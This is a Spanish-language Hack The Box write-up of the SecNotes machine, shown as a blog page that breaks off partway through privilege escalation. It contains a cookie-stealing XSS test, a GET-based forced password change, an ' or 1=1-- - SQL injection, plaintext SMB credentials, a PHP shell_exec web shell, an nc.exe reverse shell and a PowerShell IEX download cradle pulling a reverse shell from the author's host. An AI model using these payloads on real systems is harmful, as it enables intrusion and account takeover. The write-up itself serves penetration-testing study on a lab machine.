@@ -1,0 +1,922 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box SecNotes - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina SecNotes en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box SecNotes">
+<meta property="og:url" content="http://localhost:4000/htb-secnotes/">
+
+
+  <meta property="og:description" content="Resolución de la máquina SecNotes en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-secnotes/secnotes.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-12-26T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-secnotes/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box SecNotes</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box SecNotes">
+    <meta itemprop="description" content="Resolución de la máquina SecNotes en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="December 26, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box SecNotes
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-26T00:00:00-06:00">December 26, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-secnotes/banner-secnotes.jpg" alt="" /></p>
+
+<h2 id="secnotes">SecNotes</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.97.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.97
+PING 10.10.10.97 <span class="o">(</span>10.10.10.97<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.97: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>508 ms
+
+<span class="nt">---</span> 10.10.10.97 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 508.005/508.005/508.005/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.97 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-17 22:14 CST
+Initiating SYN Stealth Scan at 22:14
+Scanning 10.10.10.97 <span class="o">[</span>65535 ports]
+Discovered open port 445/tcp on 10.10.10.97
+Discovered open port 80/tcp on 10.10.10.97
+Discovered open port 8808/tcp on 10.10.10.97
+Completed SYN Stealth Scan at 22:15, 26.97s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.97
+Host is up, received user-set <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-12-17 22:14:54 CST <span class="k">for </span>27s
+Not shown: 65532 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT     STATE SERVICE       REASON
+80/tcp   open  http          syn-ack ttl 127
+445/tcp  open  microsoft-ds  syn-ack ttl 127
+8808/tcp open  ssports-bcast syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.25 seconds
+           Raw packets sent: 131085 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 21 <span class="o">(</span>924B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.97
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,445,8808
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,445,8808 10.10.10.97 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-17 22:16 CST
+Nmap scan report <span class="k">for </span>10.10.10.97
+Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+8808/tcp open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Service Info: Host: SECNOTES<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 10 Enterprise 17134 <span class="o">(</span>Windows 10 Enterprise 6.3<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: SECNOTES
+|   NetBIOS computer name: SECNOTES<span class="se">\x</span>00
+|   Workgroup: HTB<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2021-12-17T20:21:44-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-12-18T04:21:45
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 2h45m01s, deviation: 4h37m09s, median: 4m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>59.46 seconds
+</code></pre></div></div>
+
+<p>Tenemos puertos que presentan el servicio HTTP, por lo que antes de ingresar vía web, vamos a ver a lo que nos enfrentamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.97/
+http://10.10.10.97/ <span class="o">[</span>302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], RedirectLocation[login.php], X-Powered-By[PHP/7.2.7]
+http://10.10.10.97/login.php <span class="o">[</span>200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], PasswordField[password], Title[Secure Notes - Login], X-Powered-By[PHP/7.2.7]
+❯ whatweb http://10.10.10.97:8808/
+http://10.10.10.97:8808/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], Title[IIS Windows]
+</code></pre></div></div>
+
+<p>Vemos que para el puerto 80 nos hace una redirección al recurso <code class="language-plaintext highlighter-rouge">login.php</code> y poca cosa más de valor que nos pueda servir hasta el momento. Ahora si vamos a echarles un ojo vía web.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web.png" alt="" /></p>
+
+<p>Antes de probar cosas, notamos que podemos registrarnos, así que es lo que haremos primero y posteriormente vamos a tratar de ingresar con nuestras credenciales.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web1.png" alt="" /></p>
+
+<p>Le damos click en el botón <strong><em>Sign Out</em></strong> y ahora vamos a hacer unas pruebas en el panel de login, como ya contamos con unas credenciales válidas de acceso (las nuestras), vamos a colocar el usuario y una contraseña incorrecta para ver que pasa.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web4.png" alt="" /></p>
+
+<p>Tenemos que nos dice que la contraseña es incorrecta, es decir, nos está validando el usuario y lo toma como bueno. Si recordamos que al acceder correctamente nos aparece un banner que nos dice que podríamos contactar con el usuario <strong>tyler</strong>; así que vamos a probar si dicho usuario existe en el panel de login.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web5.png" alt="" /></p>
+
+<p>Vemos que el usuario existe, por lo que tenemos un usuario potencial a comprometer y podría tener algunos modulos de administrator con los cuales no contamos en nuestra cuenta que creamos. Ahora, analizando un poco el sitio web, vemos que podemos crear una nota, asi que trataremos de injectar código:</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web2.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web3.png" alt="" /></p>
+
+<p>Podemos hacer injecciones html, vamos a tratar ahora <strong><em>XSS (Cross Site Scripting)</em></strong>.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web6.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web7.png" alt="" /></p>
+
+<p>Ahora, con nuestro pluggin <strong>Edit this cookie</strong> vemos que tenemos una cookie llamanda <strong>PHPSESSID</strong> asociada a nuestra sessión. Por lo tanto, ya debemos estar pensando en un ataque de <strong><em>Cookie Hijacking</em></strong> del usuario <strong>Tyler</strong>; pero antes que de eso, vamos a validar si podemos hacerlo, así que creamos una nueva nota en donde trataremos de acceder a una imagen de un servidor HTTP (debemos compartir un servidor HTTP con python) y que nos nuestre la cookie de la sessión:</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web8.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.14.27 - - <span class="o">[</span>21/Dec/2021 21:38:00] code 404, message File not found
+10.10.14.27 - - <span class="o">[</span>21/Dec/2021 21:38:00] <span class="s2">"GET /kamiyo.jpg?cookie=PHPSESSID=oj8st60s6e5jr4bvl102j44dgv HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+
+<p>Vemos nuestra cookie de sessión, por lo tanto vamos a mandar la misma injección al usuario <strong>Tyler</strong> en el apartado de <strong>Contact Us</strong>. Sin embargo, no vemos una respuesta por parte del usuario.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web9.png" alt="" /></p>
+
+<p>Analizando un poco el sitio web, en el apartado de <strong>Change Password</strong> vemos que la solicitud viaja mediante el método POST; sin embargo, es posible que admita el método GET y una forma de probarlo sería agregando los parámetros en la URL <code class="language-plaintext highlighter-rouge">http://10.10.10.97/change_pass.php?password=hola123&amp;confirm_password=hola123&amp;submit=submit</code>.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web10.png" alt="" /></p>
+
+<p>Y nos dice que el password ha sido actualizado, por lo tanto podríamos probar de mandar dicha dirección URL al usuario <strong>Tyler</strong> para que cambie su propia contraseña a una que nosotros conozcamos y podemos acceder a su cuenta. Para validar que ha dado click en el enlace, vamos a compartirnos un servidor HTTP con python de manera adicional.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web11.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.97 - - <span class="o">[</span>21/Dec/2021 21:55:42] code 404, message File not found
+10.10.10.97 - - <span class="o">[</span>21/Dec/2021 21:55:42] <span class="s2">"GET /tyler_pwned HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+
+<p>Y a este punto la contraseña del usuario <strong>Tyler</strong> ha sido modificada por <strong>hola123</strong>, vamos a validarlo.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web12.png" alt="" /></p>
+
+<p>Otra forma de acceder a una cuenta privilegiada es mediante una injección SQL en el panel de registro ingresando como nombre de usuario <code class="language-plaintext highlighter-rouge">' or 1=1-- -</code> y lo mismo de contraseña.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web13.png" alt="" /></p>
+
+<p>Ahora ingresamos como nuestro nuevo usuario.</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web14.png" alt="" /></p>
+
+<p>Vemos la notas de todos los usuarios, incluyendo las de <strong>Tyler</strong> en donde tenemos unas credenciales de acceso bajo la nota <strong>new site</strong> y como pista nos dan la ruta <code class="language-plaintext highlighter-rouge">secnotes.htb\new-site</code>; por lo que ya debemos estar pensando en acceso por el servicio de SMB, por lo que primero trataremos de ver recursos a con una <strong>Null Session</strong> y después con las credenciales que nos dá la página.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.97 <span class="nt">-N</span>
+session setup failed: NT_STATUS_ACCESS_DENIED
+❯ smbclient <span class="nt">-L</span> 10.10.10.97 <span class="nt">-U</span> <span class="s1">'tyler'</span>
+Enter WORKGROUP<span class="se">\t</span>yler<span class="s1">'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        new-site        Disk      
+SMB1 disabled -- no workgroup available
+❯ smbmap -u '</span>tyler<span class="s1">' -p '</span>92g!mA8BGjOirkL%OG<span class="k">*</span>&amp;<span class="s1">' -H 10.10.10.97
+[+] IP: 10.10.10.97:445 Name: secnotes.htb                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        new-site                                                READ, WRITE
+</span></code></pre></div></div>
+
+<p>Vemos el recurso <code class="language-plaintext highlighter-rouge">new-site</code>, por lo que vamos a ingresar y ver que información encontramos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.97/new-site <span class="nt">-U</span> <span class="s1">'tyler'</span>
+Enter WORKGROUP<span class="se">\t</span>yler<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Aug 19 13:06:14 2018
+  ..                                  D        0  Sun Aug 19 13:06:14 2018
+  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
+
+                7736063 blocks of size 4096. 3396336 blocks available
+smb: \&gt;
+</span></code></pre></div></div>
+
+<p>Vemos archivos asociados a un sitio web y además contamos con permisos de escritura; por lo que ya debemos estar pensando en subir un archivo aspx malicioso que nos permite la ejecución de código remoto; por lo tanto vamos a crear un archivo de prueba y tratar de verlo vía web por el puerto 8808:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"Esto es una prueba"</span> <span class="o">&gt;</span> test.txt
+❯ smbclient //10.10.10.97/new-site <span class="nt">-U</span> <span class="s1">'tyler'</span>
+Enter WORKGROUP<span class="se">\t</span>yler<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; put test.txt
+putting file test.txt as \test.txt (0.0 kb/s) (average 1.7 kb/s)
+smb: \&gt; dir
+  .                                   D        0  Sun Dec 26 18:26:26 2021
+  ..                                  D        0  Sun Dec 26 18:26:26 2021
+  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
+  test.txt                            A       19  Sun Dec 26 18:26:27 2021
+
+                7736063 blocks of size 4096. 3396794 blocks available
+smb: \&gt;
+</span></code></pre></div></div>
+
+<p>Vamos a verlo vía web:</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web15.png" alt="" /></p>
+
+<p>Como el sitio web nos interpreta archivos php, podemos crear nuestro archivo php que nos permita la ejecución de comandos a nivel de sistema y lo subimos al sistema.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> put shell.php
+putting file shell.php as <span class="se">\s</span>hell.php <span class="o">(</span>0.2 kb/s<span class="o">)</span> <span class="o">(</span>average 1.7 kb/s<span class="o">)</span>
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<p>Ahora si tratamos de ejecutar un comando:</p>
+
+<p><img src="/assets/images/htb-secnotes/secnotes-web16.png" alt="" /></p>
+
+<p>Lo que nos queda es ingresar al sistema mediante una reverse shell haciendo uso del archivo <code class="language-plaintext highlighter-rouge">nc.exe</code>, por lo que tambíen lo subimos al sistema, nos ponemos en escucha por el puerto 443 y ejecutamos nuestra reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> put nc.exe
+putting file nc.exe as <span class="se">\n</span>c.exe <span class="o">(</span>49.2 kb/s<span class="o">)</span> <span class="o">(</span>average 7.5 kb/s<span class="o">)</span>
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sun Dec 26 18:52:25 2021
+  ..                                  D        0  Sun Dec 26 18:52:25 2021
+  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
+  nc.exe                              A    28160  Sun Dec 26 18:52:26 2021
+  shell.php                           A       65  Sun Dec 26 18:50:33 2021
+
+                7736063 blocks of size 4096. 3397277 blocks available
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">http://10.10.10.97:8808/shell.php?cmd=nc.exe -e cmd 10.10.14.27 443</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.97] 51477
+Microsoft Windows <span class="o">[</span>Version 10.0.17134.228]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+whoami
+</span>secnotes<span class="se">\t</span>yler
+
+C:<span class="se">\i</span>netpub<span class="se">\n</span>ew-site&gt;
+</code></pre></div></div>
+
+<p>Ya nos encontramos en la máquina como el usuario <strong>tyler</strong> y podemos visualizar la flag (user.txt). Por lo que ahora nos falta escalar privilegios; por lo que si accedemos al escritorio del usuario <strong>tyler</strong> vemos que tiene un archivo curioso llamando <code class="language-plaintext highlighter-rouge">bash.lnk</code>, es decir, un hipervínculo. Para obtener el origen de dicho archivo, vamos a obtener una reverse shell con powershell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt; <span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop
+
+08/19/2018  02:51 PM    &lt;DIR&gt;          <span class="nb">.</span>
+08/19/2018  02:51 PM    &lt;DIR&gt;          ..
+06/22/2018  02:09 AM             1,293 bash.lnk
+08/02/2021  02:32 AM             1,210 Command Prompt.lnk
+04/11/2018  03:34 PM               407 File Explorer.lnk
+06/21/2018  04:50 PM             1,417 Microsoft Edge.lnk
+06/21/2018  08:17 AM             1,110 Notepad++.lnk
+12/26/2021  04:14 PM                34 user.txt
+08/19/2018  09:59 AM             2,494 Windows PowerShell.lnk
+               7 File<span class="o">(</span>s<span class="o">)</span>          7,965 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>  13,913,157,632 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>Por lo que primero, vamos a buscar nuestro archivo <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code>, lo traemos a nuestro directorio de trabajo y al final del archivo, agregamos la linea <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 443</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate Invoke-PowerShellTcp
+/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
+❯ <span class="nb">cp</span> /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Nos compartimos un servidor HTTP con python, nos ponemos en escucha por el puerto 443 y procedemos a entablarnos una reverse shell en powershell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.97 - - <span class="o">[</span>26/Dec/2021 19:23:03] <span class="s2">"GET /PS.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt; powershell IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.27/PS.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.97] 53148
+Windows PowerShell running as user SECNOTES<span class="nv">$ </span>on SECNOTES
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>secnotes<span class="se">\t</span>yler
+PS C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>Ahora, vamos a crear un objecto llamado <code class="language-plaintext highlighter-rouge">Wscript</code> y la variable <code class="language-plaintext highlighter-rouge">shortcut</code> que nos ayudarán a obtener información sobre el archivo <code class="language-plaintext highlighter-rouge">bash.lnk</code>:</p>
+
